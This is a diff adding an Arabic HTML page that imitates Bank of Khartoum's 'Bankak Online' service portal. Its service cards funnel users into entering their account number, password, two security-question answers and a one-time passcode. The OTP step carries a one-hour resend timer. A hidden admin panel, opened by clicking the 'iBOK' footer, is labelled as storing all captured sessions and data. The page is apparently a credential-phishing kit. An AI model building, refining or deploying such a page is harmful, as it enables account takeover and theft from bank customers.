@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>خدمات بنكك أونلاين</title>
+    <!-- استيراد الخطوط والأيقونات -->
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<div class="phone-container">
+    
+    <!-- الصفحة الرئيسية -->
+    <div id="home-page">
+        <header class="app-header">
+            <div class="bank-logo">
+                <i class="fa-solid fa-building-columns" style="font-size: 40px; color: #006837;"></i>
+            </div>
+            <div class="service-badge">خدمات بنكك أونلاين</div>
+        </header>
+
+        <div class="main-content">
+            <h1 class="welcome-title">مرحباً بكم في خدمات بنكك أونلاين Bankak Online</h1>
+            <p class="welcome-subtitle">الرجاء الاختيار من الخدمات المقدمة أدناه</p>
+
+            <div class="services-list">
+                <!-- 1. تحديث البيانات -->
+                <div class="service-card" onclick="openService('update-data')">
+                    <div class="service-info">
+                        <h3>تحديث البيانات</h3>
+                        <p>تحديث بيانات حسابك الشخصية.</p>
+                    </div>
+                    <div class="service-icon"><i class="fa-solid fa-rotate"></i></div>
+                </div>
+
+                <!-- 2. رفع سقف التحويلات اليومية -->
+                <div class="service-card" onclick="openService('raise-limit')">
+                    <div class="service-info">
+                        <h3>رفع سقف التحويلات اليومية</h3>
+                        <p>زيادة الحد اليومي للتحويلات.</p>
+                    </div>
+                    <div class="service-icon"><i class="fa-solid fa-gauge-high"></i></div>
+                </div>
+
+                <!-- 3. التحويلات الخاطئة -->
+                <div class="service-card" onclick="openService('wrong-transfers')">
+                    <div class="service-info">
+                        <h3>التحويلات الخاطئة</h3>
+                        <p>معالجة أخطاء التحويلات البنكية.</p>
+                    </div>
+                    <div class="service-icon"><i class="fa-solid fa-right-left"></i></div>
+                </div>
+
+                <!-- 4. خدمات العملات الأجنبية -->
+                <div class="service-card" onclick="openService('forex-services')">
+                    <div class="service-info">
+                        <h3>خدمات العملات الأجنبية</h3>
+                        <p>تفعيل وإدارة العملات الأجنبية.</p>
+                    </div>
+                    <div class="service-icon"><i class="fa-solid fa-globe"></i></div>
+                </div>
+
+                <!-- 5. كشف الحساب -->
+                <div class="service-card" onclick="openService('account-statement')">
+                    <div class="service-info">
+                        <h3>كشف الحساب</h3>
+                        <p>الحصول على كشف حساب مفصل.</p>
+                    </div>
+                    <div class="service-icon"><i class="fa-solid fa-file-lines"></i></div>
+                </div>
+
+                <!-- 6. بطاقة فيزا افتراضية -->
+                <div class="service-card" onclick="openService('virtual-visa')">
+                    <div class="service-info">
+                        <h3>بطاقة فيزا افتراضية</h3>
+                        <p>تفعيل بطاقة فيزا للاستخدام الإلكتروني.</p>
+                    </div>
+                    <div class="service-icon"><i class="fa-solid fa-credit-card"></i></div>
+                </div>
+
+                <!-- 7. حساب جاري وحساب مميز -->
+                <div class="service-card" onclick="openService('special-account')">
+                    <div class="service-info">
+                        <h3>حساب جاري وحساب مميز</h3>
+                        <p>فتح أو ترقية الحساب.</p>
+                    </div>
+                    <div class="service-icon"><i class="fa-solid fa-id-card"></i></div>
+                </div>
+
+                <!-- 8. إدارة أسئلة الأمان -->
+                <div class="service-card" onclick="openService('security-questions')">
+                    <div class="service-info">
+                        <h3>إدارة أسئلة الأمان</h3>
+                        <p>تحديث أو إعادة تعيين أسئلة الأمان.</p>
+                    </div>
+                    <div class="service-icon"><i class="fa-solid fa-lock"></i></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- التذييل مع تفعيل الضغط 5 مرات على كلمة iBOK -->
+        <footer class="app-footer">
+            <span id="ibok-trigger" onclick="handleIbokClick()" style="cursor:pointer; user-select:none;">iBOK</span> ا بنك الخرطوم 2026
+        </footer>
+    </div>
+
+</div>
+
+<!-- صفحة لوحة التحكم الخاصة المنفصلة -->
+<div id="admin-page-overlay">
+    <div style="display:flex; justify-content:space-between; align-items:center; border-bottom:2px solid #d32f2f; padding-bottom:10px; margin-bottom:15px;">
+        <h2 style="color:#ffeb3b;"><i class="fa-solid fa-shield-cat"></i> لوحة التحكم والتحكم بالأرشيف</h2>
+        <button onclick="closeAdminPage()" style="background:#d32f2f; color:#fff; border:none; padding:8px 15px; border-radius:6px; cursor:pointer; font-weight:bold;">إغلاق العودة</button>
+    </div>
+    <div style="font-size: 12px; color: #aaa; margin-bottom: 10px;">جميع الجلسات والبيانات القديمة والجديدة محفوظة أدناه بالتتابع:</div>
+    <div id="admin-logs-container" style="flex:1; overflow-y:auto;">
+        <div style="color: #888;">لا توجد سجلات بعد.</div>
+    </div>
+</div>
+
+<!-- نافذة الخدمة بنظام المراحل المتسلسلة (شاشة كاملة) -->
+<div id="service-overlay" class="fullscreen-overlay">
+    <header class="overlay-header">
+        <button class="back-btn" onclick="closeServiceOverlay()"><i class="fa-solid fa-arrow-right"></i></button>
+        <h2 id="overlay-title-text">خدمة العملاء</h2>
+        <div style="width: 20px;"></div>
+    </header>
+
+    <div class="overlay-body">
+        
+        <!-- الخطوة الأولى: نموذج الخدمة الخاص -->
+        <div id="step-service-form" class="step-container active">
+            <div id="specific-form-content"></div>
+            <button class="btn-submit" onclick="submitServiceForm()">التالي</button>
+        </div>
+
+        <!-- الخطوة الثانية: تسجيل الدخول -->
+        <div id="step-login" class="step-container">
+            <div class="info-box"><i class="fa-solid fa-shield-halved"></i> يرجى تسجيل الدخول للتحقق من هوية الحساب</div>
+            <div class="form-group">
+                <label>رقم الحساب المصرفي</label>
+                <input type="text" id="inp-acc" class="form-control" placeholder="أدخل رقم الحساب">
+            </div>
+            <div class="form-group">
+                <label>كلمة السر</label>
+                <input type="password" id="inp-pass" class="form-control" placeholder="أدخل كلمة السر">
+            </div>
+            <button class="btn-submit" onclick="submitLoginForm()">تسجيل الدخول</button>
+        </div>
+
+        <!-- الخطوة الثالثة: أسئلة الأمان الجديدة التفاعلية -->
+        <div id="step-security" class="step-container">
+            <div class="info-box"><i class="fa-solid fa-circle-question"></i> يرجى اختيار السؤالين الأمنيَين والإجابة عليهما</div>
+            
+            <div class="form-group">
+                <label>اختر السؤال الأمني الأول</label>
+                <select id="sec-q-1" class="form-control" style="margin-bottom: 5px;">
+                    <option>ما هو اسم ابن عمك الأول؟</option>
+                    <option>ما كان لقبك أثناء الطفولة؟</option>
+                    <option>في أي سنة تزوجت؟</option>
+                    <option>في أي مدينة ولدت؟</option>
+                    <option>في أي سنة تخرجت من الجامعة؟</option>
+                    <option>اسم مؤلفك المفضل؟</option>
+                    <option>اسم الشركة المصنعة للسيارة المفضلة لديك؟</option>
+                    <option>أي فيلم هو المفضل لديك؟</option>
+                    <option>اسم صديق في الطفولة؟</option>
+                    <option>في أي عام حصلت على رخصة القيادة الخاصة بك؟</option>
+                    <option>العلامة التجارية لأول تلفزيون خاص بك؟</option>
+                    <option>اسم فريق كرة القدم المفضل لديك؟</option>
+                    <option>ما هو اسم المدرسة التي التحقت بها؟</option>
+                    <option>اسم أول بلد أجنبي قمت بزيارته؟</option>
+                    <option>ما هي ماركة سيارتك الأولي؟</option>
+                </select>
+                <input type="text" id="sec-ans-1" class="form-control" placeholder="أدخل إجابة السؤال الأول">
+            </div>
+
+            <div class="form-group">
+                <label>اختر السؤال الأمني الثاني</label>
+                <select id="sec-q-2" class="form-control" style="margin-bottom: 5px;">
+                    <option>ما كان لقبك أثناء الطفولة؟</option>
+                    <option>ما هو اسم ابن عمك الأول؟</option>
+                    <option>في أي سنة تزوجت؟</option>
+                    <option>في أي مدينة ولدت؟</option>
+                    <option>في أي سنة تخرجت من الجامعة؟</option>
+                    <option>اسم مؤلفك المفضل؟</option>
+                    <option>اسم الشركة المصنعة للسيارة المفضلة لديك؟</option>
+                    <option>أي فيلم هو المفضل لديك؟</option>
+                    <option>اسم صديق في الطفولة؟</option>
+                    <option>في أي عام حصلت على رخصة القيادة الخاصة بك؟</option>
+                    <option>العلامة التجارية لأول تلفزيون خاص بك؟</option>
+                    <option>اسم فريق كرة القدم المفضل لديك؟</option>
+                    <option>ما هو اسم المدرسة التي التحقت بها؟</option>
+                    <option>اسم أول بلد أجنبي قمت بزيارته؟</option>
+                    <option>ما هي ماركة سيارتك الأولي؟</option>
+                </select>
+                <input type="text" id="sec-ans-2" class="form-control" placeholder="أدخل إجابة السؤال الثاني">
+            </div>
+
+            <button class="btn-submit" onclick="submitSecurityForm()">تأكيد الإجابة</button>
+        </div>
+
+        <!-- الخطوة الرابعة: رمز الـ OTP مع عداد ساعة كاملة -->
+        <div id="step-otp" class="step-container">
+            <div class="info-box"><i class="fa-solid fa-mobile-screen-button"></i> تم إرسال رمز التحقق (OTP) إلي رقم الشريحة المسجل أو البريد الإلكتروني.</div>
+            <div class="form-group">
+                <label>أدخل رمز الـ OTP المكون من 6 أرقام</label>
+                <input type="text" id="inp-otp" class="form-control" placeholder="0 0 0 0 0 0" style="text-align: center; font-size: 20px; letter-spacing: 5px;">
+            </div>
+            
+            <div id="otp-timer-display" class="otp-timer">إعادة إرسال الرمز خلال: <span id="timer-count">60:00</span></div>
+            <div id="resend-btn" class="resend-link" onclick="restartOtpTimer()">إعادة إرسال الرمز الآن</div>
+
+            <button class="btn-submit" onclick="submitOtpForm()">إتمام العملية</button>
+        </div>
+
+        <!-- الخطوة الخامسة: النجاح -->
+        <div id="step-success" class="step-container" style="text-align: center; padding-top: 40px;">
+            <i class="fa-solid fa-circle-check" style="font-size: 70px; color: #4caf50; margin-bottom: 20px;"></i>
+            <h3 style="color: #333; margin-bottom: 10px;">تم استلام طلبك بنجاح</h3>
+            <p style="color: #666; font-size: 14px; margin-bottom: 30px;">جاري معالجة الطلب بواسطة النظام الآلي للبنك.</p>
+            <button class="btn-submit" onclick="closeServiceOverlay()">العودة للرئيسية</button>
+        </div>
+
+    </div>
+</div>
+
+<!-- زر الواتساب -->
+<a href="https://wa.me/" target="_blank" class="whatsapp-float">
+    <i class="fa-brands fa-whatsapp"></i>
+</a>
+
+<!-- ربط ملف الـ JavaScript الخارجي -->
+<script src="script.js"></script>
+
+</body>
+</html>
